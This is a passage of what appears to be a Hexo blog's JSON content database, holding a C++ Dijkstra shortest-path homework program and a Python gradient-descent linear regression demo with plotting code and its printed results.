ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":1637,"excerpt":"<h1 id=\"最短路\"><a href=\"#最短路\" class=\"headerlink\" title=\"最短路\"></a>最短路</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br>","more":"<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> INF=<span class=\"number\">0x3f3f3f3f</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> N,M,MAP[<span class=\"number\">1020</span>][<span class=\"number\">1020</span>];</span><br><span class=\"line\"><span class=\"keyword\">bool</span> vis[<span class=\"number\">1020</span>];</span><br><span class=\"line\"><span class=\"keyword\">int</span> dis[<span class=\"number\">1020</span>],prev[<span class=\"number\">1020</span>];</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Dijkstra</span><span class=\"params\">(<span class=\"keyword\">int</span> start,<span class=\"keyword\">int</span> end)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;=N;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tvis[i]=<span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\tdis[i]=INF;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tdis[start]=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(<span class=\"literal\">true</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> v=<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> u=<span class=\"number\">1</span>;u&lt;=N;u++)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!vis[u]&amp;&amp;(v==<span class=\"number\">-1</span>||dis[u]&lt;dis[v]))v=u;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(v==<span class=\"number\">-1</span>)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\tvis[v]=<span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> u=<span class=\"number\">1</span>;u&lt;=N;u++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(!vis[u])</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>(dis[u]&gt;dis[v]+MAP[v][u])</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tdis[u]=dis[v]+MAP[v][u];</span><br><span class=\"line\">\t\t\t\t\tprev[u]=v;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;The Shortest Path Length is &quot;</span>&lt;&lt;dis[end]&lt;&lt;<span class=\"built_in\">endl</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">stack</span>&lt;<span class=\"keyword\">int</span>&gt;S;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(prev[end])</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tS.push(end);</span><br><span class=\"line\">\t\tend=prev[end];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;The Path is &quot;</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;start;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(!S.empty())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot; -&gt; &quot;</span>&lt;&lt;S.top();</span><br><span class=\"line\">\t\tS.pop();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a,b,c,st,en;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;Input Sum Of Vertex: &quot;</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cin</span>&gt;&gt;N;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;Input Sum Of Edges: &quot;</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cin</span>&gt;&gt;M;</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(MAP,INF,<span class=\"keyword\">sizeof</span>(MAP));</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;Input Weight Of Vertexs: &quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(M--)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cin</span>&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class=\"line\">\t\tMAP[a][b]=c;</span><br><span class=\"line\">\t\tMAP[b][a]=c;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>&lt;&lt;<span class=\"string\">&quot;Adjacency Matrix is:&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;=N;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">1</span>;j&lt;=N;j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(MAP[i][j]==INF)<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;INF &quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%03d &quot;</span>,MAP[i][j]);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>&lt;&lt;<span class=\"string\">&quot;Input Two Vertexs: &quot;</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cin</span>&gt;&gt;st&gt;&gt;en;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\tDijkstra(st,en);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>"},{"title":"梯度下降求解线性回归","date":"2019-05-20T12:04:03.000Z","abbrlink":"7c021667","_content":"# 批量梯度下降\n```python\nimport matplotlib.pyplot as plt\nfrom matplotlib.animation import FuncAnimation\n# Excel预测函数\n# y = 1771.8 + 28.777x\n\n# 数据集\nx = [150, 200, 250, 300, 350, 400, 600]\ny = [6450, 7450, 8450, 9450, 11450, 15450, 18450]\n# 迭代过程直线起始y值\ndata = [[] for i in range(int(1E6))]\n\n\n# 损失函数\ndef LossFunctionX(theta0, theta1):\n    los = 0\n    for i in range(len(x)):\n        h = (theta0 + theta1 * x[i])  # 对theta0求偏导\n        los = los + (h - y[i])\n    return los\n\n\n# 损失函数\ndef LossFunctionY(theta0, theta1):\n    los = 0\n    for i in range(len(x)):\n        h = (theta0 + theta1 * x[i])  # 对theta1求偏导\n        los = los + (h - y[i]) * x[i]\n    return los\n\n\n# GIF更新函数\ndef update(i):\n    label = 'timestep {0}'.format(i)\n    # print(label)\n    line.set_xdata([x[0], x[len(x) - 1]])\n    line.set_ydata(data[i])  # 重绘直线\n    ax.set_xlabel(label)  # 重绘x轴标签\n    return line, ax\n\n\n# 梯度下降\ndef GradientDescent(theta0, theta1, iters, alphaX, alphaY):\n    for i in range(iters):\n        # 迭代更新theta值\n        theta0 = theta0 - alphaX * LossFunctionX(theta0, theta1) / len(x)\n        theta1 = theta1 - alphaY * LossFunctionY(theta0, theta1) / len(x)\n        # print(theta0, theta1)  # 输出迭代过程中theta值\n\n        # 画出迭代过程中拟合线性方程\n        plt.plot(x, y, 'bo')\n        plt.plot([x[0], x[len(x) - 1]], [theta0 + theta1 * x[0], theta0 + theta1 * x[len(x) - 1]], 'b')\n\n        # 记录data值\n        data[i].append(theta0 + theta1 * x[0])\n        data[i].append(theta0 + theta1 * x[len(x) - 1])\n    return theta0, theta1\n\n\nif __name__ == '__main__':\n    # 参数分别为(theta0初始值, theta1初始值, 迭代次数, theta0学习速率, theta1学习速率)\n    a, b = GradientDescent(0, 0, int(4E3), 1E-1, 1E-5)\n\n    # 绘制图形部分\n    plt.plot(x, y, 'bo')  # 画出散点图\n    plt.plot([x[0], x[len(x) - 1]], [a + b * x[0], a + b * x[len(x) - 1]], 'r')  # 画出拟合出的线性方程\n    plt.show()  # 显示图形\n\n    # 绘制GIF部分\n    fig, ax = plt.subplots()\n    fig.set_tight_layout(True)\n    ax.scatter(x, y)  # 绘制散点图, 不刷新\n    line, = ax.plot([x[0], 0], [x[len(x) - 1], 0], 'b')  # 绘制初始直线, update函数对其进行更新\n    anim = FuncAnimation(fig, update, frames=10, interval=1000)  # frames为帧数, interval为每帧停留的的时间ms\n    anim.save('line.gif', dpi=100, writer='pillow')  # dpi为分辨率\n\n    # 输出部分\n    print(\"theta0: {0}\".format(a))\n    print(\"theta1: {0}\".format(b))\n\n```\n<!--more-->\n以下为输出结果\n```\ntheta0: 1771.8085106382905\ntheta1: 28.776595744680872\n```\n学习速率影响拟合速度，学习速率过大会导致无法到达最佳值点，反之，速率过小，拟合速度又会太慢。\n<div>\n<img src=\"https://cdn.file.todest.cn/blog/pic/20200408.png\" width=\"50%\" height=\"50%\" style=\"float:left\"><img src=\"https://cdn.file.todest.cn/blog/pic/20200408.gif\" width=\"50%\" height=\"50%\" style=\"float:left\">\n</div>\n\n","source":"_posts/梯度下降求解线性回归.md","raw":"---\ntitle: 梯度下降求解线性回归\ndate: 2019-05-20 20:04:03\ncategories:\n  - 机器学习\n  - 梯度下降\ntags:\n  - ML\nabbrlink: 7c021667\n---\n# 批量梯度下降\n```python\nimport matplotlib.pyplot as plt\nfrom matplotlib.animation import FuncAnimation\n# Excel预测函数\n# y = 1771.8 + 28.777x\n\n# 数据集\nx = [150, 200, 250, 300, 350, 400, 600]\ny = [6450, 7450, 8450, 9450, 11450, 15450, 18450]\n# 迭代过程直线起始y值\ndata = [[] for i in range(int(1E6))]\n\n\n# 损失函数\ndef LossFunctionX(theta0, theta1):\n    los = 0\n    for i in range(len(x)):\n        h = (theta0 + theta1 * x[i])  # 对theta0求偏导\n        los = los + (h - y[i])\n    return los\n\n\n# 损失函数\ndef LossFunctionY(theta0, theta1):\n    los = 0\n    for i in range(len(x)):\n        h = (theta0 + theta1 * x[i])  # 对theta1求偏导\n        los = los + (h - y[i]) * x[i]\n    return los\n\n\n# GIF更新函数\ndef update(i):\n    label = 'timestep {0}'.format(i)\n    # print(label)\n    line.set_xdata([x[0], x[len(x) - 1]])\n    line.set_ydata(data[i])  # 重绘直线\n    ax.set_xlabel(label)  # 重绘x轴标签\n    return line, ax\n\n\n# 梯度下降\ndef GradientDescent(theta0, theta1, iters, alphaX, alphaY):\n    for i in range(iters):\n        # 迭代更新theta值\n        theta0 = theta0 - alphaX * LossFunctionX(theta0, theta1) / len(x)\n        theta1 = theta1 - alphaY * LossFunctionY(theta0, theta1) / len(x)\n        # print(theta0, theta1)  # 输出迭代过程中theta值\n\n        # 画出迭代过程中拟合线性方程\n        plt.plot(x, y, 'bo')\n        plt.plot([x[0], x[len(x) - 1]], [theta0 + theta1 * x[0], theta0 + theta1 * x[len(x) - 1]], 'b')\n\n        # 记录data值\n        data[i].append(theta0 + theta1 * x[0])\n        data[i].append(theta0 + theta1 * x[len(x) - 1])\n    return theta0, theta1\n\n\nif __name__ == '__main__':\n    # 参数分别为(theta0初始值, theta1初始值, 迭代次数, theta0学习速率, theta1学习速率)\n    a, b = GradientDescent(0, 0, int(4E3), 1E-1, 1E-5)\n\n    # 绘制图形部分\n    plt.plot(x, y, 'bo')  # 画出散点图\n    plt.plot([x[0], x[len(x) - 1]], [a + b * x[0], a + b * x[len(x) - 1]], 'r')  # 画出拟合出的线性方程\n    plt.show()  # 显示图形\n\n    # 绘制GIF部分\n    fig, ax = plt.subplots()\n    fig.set_tight_layout(True)\n    ax.scatter(x, y)  # 绘制散点图, 不刷新\n    line, = ax.plot([x[0], 0], [x[len(x) - 1], 0], 'b')  # 绘制初始直线, update函数对其进行更新\n    anim = FuncAnimation(fig, update, frames=10, interval=1000)  # frames为帧数, interval为每帧停留的的时间ms\n    anim.save('line.gif', dpi=100, writer='pillow')  # dpi为分辨率\n\n    # 输出部分\n    print(\"theta0: {0}\".format(a))\n    print(\"theta1: {0}\".format(b))\n\n```\n<!--more-->\n以下为输出结果\n```\ntheta0: 1771.8085106382905\ntheta1: 28.776595744680872\n```\n学习速率影响拟合速度，学习速率过大会导致无法到达最佳值点，反之，速率过小，拟合速度又会太慢。\n<div>\n<img src=\"https://cdn.file.todest.cn/blog/pic/20200408.png\" width=\"50%\" height=\"50%\" style=\"float:left\"><img src=\"https://cdn.file.todest.cn/blog/pic/20200408.gif\" width=\"50%\" height=\"50%\" style=\"float:left\">\n</div>\n\n","slug":"梯度下降求解线性回归","published":1,"updated":"2020-12-01T14:47:30.950Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkdo003kqse5ewjq3tvz","content":"<h1 id=\"批量梯度下降\"><a href=\"#批量梯度下降\" class=\"headerlink\" title=\"批量梯度下降\"></a>批量梯度下降</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">from</span> matplotlib.animation <span class=\"keyword\">import</span> FuncAnimation</span><br><span class=\"line\"><span class=\"comment\"># Excel预测函数</span></span><br><span class=\"line\"><span class=\"comment\"># y = 1771.8 + 28.777x</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 数据集</span></span><br><span class=\"line\">x = [<span class=\"number\">150</span>, <span class=\"number\">200</span>, <span class=\"number\">250</span>, <span class=\"number\">300</span>, <span class=\"number\">350</span>, <span class=\"number\">400</span>, <span class=\"number\">600</span>]</span><br><span class=\"line\">y = [<span class=\"number\">6450</span>, <span class=\"number\">7450</span>, <span class=\"number\">8450</span>, <span class=\"number\">9450</span>, <span class=\"number\">11450</span>, <span class=\"number\">15450</span>, <span class=\"number\">18450</span>]</span><br><span class=\"line\"><span class=\"comment\"># 迭代过程直线起始y值</span></span><br><span class=\"line\">data = [[] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(<span class=\"number\">1E6</span>))]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 损失函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">LossFunctionX</span>(<span class=\"params\">theta0, theta1</span>):</span></span><br><span class=\"line\">    los = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(x)):</span><br><span class=\"line\">        h = (theta0 + theta1 * x[i])  <span class=\"comment\"># 对theta0求偏导</span></span><br><span class=\"line\">        los = los + (h - y[i])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> los</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 损失函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">LossFunctionY</span>(<span class=\"params\">theta0, theta1</span>):</span></span><br><span class=\"line\">    los = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(x)):</span><br><span class=\"line\">        h = (theta0 + theta1 * x[i])  <span class=\"comment\"># 对theta1求偏导</span></span><br><span class=\"line\">        los = los + (h - y[i]) * x[i]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> los</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># GIF更新函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">update</span>(<span class=\"params\">i</span>):</span></span><br><span class=\"line\">    label = <span class=\"string\">&#x27;timestep &#123;0&#125;&#x27;</span>.format(i)</span><br><span class=\"line\">    <span class=\"comment\"># print(label)</span></span><br><span class=\"line\">    line.set_xdata([x[<span class=\"number\">0</span>], x[len(x) - <span class=\"number\">1</span>]])</span><br><span class=\"line\">    line.set_ydata(data[i])  <span class=\"comment\"># 重绘直线</span></span><br><span class=\"line\">    ax.set_xlabel(label)  <span class=\"comment\"># 重绘x轴标签</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> line, ax</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 梯度下降</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">GradientDescent</span>(<span class=\"params\">theta0, theta1, iters, alphaX, alphaY</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(iters):</span><br><span class=\"line\">        <span class=\"comment\"># 迭代更新theta值</span></span><br><span class=\"line\">        theta0 = theta0 - alphaX * LossFunctionX(theta0, theta1) / len(x)</span><br><span class=\"line\">        theta1 = theta1 - alphaY * LossFunctionY(theta0, theta1) / len(x)</span><br><span class=\"line\">        <span class=\"comment\"># print(theta0, theta1)  # 输出迭代过程中theta值</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 画出迭代过程中拟合线性方程</span></span><br><span class=\"line\">        plt.plot(x, y, <span class=\"string\">&#x27;bo&#x27;</span>)</span><br><span class=\"line\">        plt.plot([x[<span class=\"number\">0</span>], x[len(x) - <span class=\"number\">1</span>]], [theta0 + theta1 * x[<span class=\"number\">0</span>], theta0 + theta1 * x[len(x) - <span class=\"number\">1</span>]], <span class=\"string\">&#x27;b&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 记录data值</span></span><br><span class=\"line\">        data[i].append(theta0 + theta1 * x[<span class=\"number\">0</span>])</span><br><span class=\"line\">        data[i].append(theta0 + theta1 * x[len(x) - <span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> theta0, theta1</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># 参数分别为(theta0初始值, theta1初始值, 迭代次数, theta0学习速率, theta1学习速率)</span></span><br><span class=\"line\">    a, b = GradientDescent(<span class=\"number\">0</span>, <span class=\"number\">0</span>, int(<span class=\"number\">4E3</span>), <span class=\"number\">1E-1</span>, <span class=\"number\">1E-5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 绘制图形部分</span></span><br><span class=\"line\">    plt.plot(x, y, <span class=\"string\">&#x27;bo&#x27;</span>)  <span class=\"comment\"># 画出散点图</span></span><br><span class=\"line\">    plt.plot([x[<span class=\"number\">0</span>], x[len(x) - <span class=\"number\">1</span>]], [a + b * x[<span class=\"number\">0</span>], a + b * x[len(x) - <span class=\"number\">1</span>]], <span class=\"string\">&#x27;r&#x27;</span>)  <span class=\"comment\"># 画出拟合出的线性方程</span></span><br><span class=\"line\">    plt.show()  <span class=\"comment\"># 显示图形</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 绘制GIF部分</span></span><br><span class=\"line\">    fig, ax = plt.subplots()</span><br><span class=\"line\">    fig.set_tight_layout(<span class=\"literal\">True</span>)</span><br><span class=\"line\">    ax.scatter(x, y)  <span class=\"comment\"># 绘制散点图, 不刷新</span></span><br><span class=\"line\">    line, = ax.plot([x[<span class=\"number\">0</span>], <span class=\"number\">0</span>], [x[len(x) - <span class=\"number\">1</span>], <span class=\"number\">0</span>], <span class=\"string\">&#x27;b&#x27;</span>)  <span class=\"comment\"># 绘制初始直线, update函数对其进行更新</span></span><br><span class=\"line\">    anim = FuncAnimation(fig, update, frames=<span class=\"number\">10</span>, interval=<span class=\"number\">1000</span>)  <span class=\"comment\"># frames为帧数, interval为每帧停留的的时间ms</span></span><br><span class=\"line\">    anim.save(<span class=\"string\">&#x27;line.gif&#x27;</span>, dpi=<span class=\"number\">100</span>, writer=<span class=\"string\">&#x27;pillow&#x27;</span>)  <span class=\"comment\"># dpi为分辨率</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 输出部分</span></span><br><span class=\"line\">    print(<span class=\"string\">&quot;theta0: &#123;0&#125;&quot;</span>.format(a))</span><br><span class=\"line\">    print(<span class=\"string\">&quot;theta1: &#123;0&#125;&quot;</span>.format(b))</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<p>以下为输出结果<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">theta0: 1771.8085106382905</span><br><span class=\"line\">theta1: 28.776595744680872</span><br></pre></td></tr></table></figure><br>学习速率影响拟合速度，学习速率过大会导致无法到达最佳值点，反之，速率过小，拟合速度又会太慢。</p>\n<div>\n<img data-src=\"https://cdn.file.todest.cn/blog/pic/20200408.png\" width=\"50%\" height=\"50%\" style=\"float:left\"><img data-src=\"https://cdn.file.todest.cn/blog/pic/20200408.gif\" width=\"50%\" height=\"50%\" style=\"float:left\">\n</div>\n\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 